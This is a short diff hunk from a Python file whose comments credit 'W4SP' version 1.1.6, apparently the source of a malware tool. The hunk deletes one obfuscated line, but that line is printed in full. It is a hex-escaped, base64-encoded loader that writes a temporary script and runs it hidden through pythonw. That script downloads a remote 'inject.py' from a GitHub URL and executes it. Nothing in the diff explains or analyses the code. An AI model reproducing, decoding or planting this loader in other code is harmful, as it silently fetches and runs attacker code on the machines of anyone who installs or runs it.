@@ -14,8 +14,6 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("%ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQ0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgX3NzeXN0ZW0NCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Qwa2FyZXY0MDQvdGVzL21haW4vaW5qZWN0LnB5IikucmVhZCgpKSIiIikNCl90dG1wLmNsb3NlKCkNCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikNCmV4Y2VwdDogcGFzcw==%"),'<string>','\x65\x78\x65\x63'))
-
 #  THIS IS 1.1.6 VERSION
 #    BY W4SP, loTus04
 # 
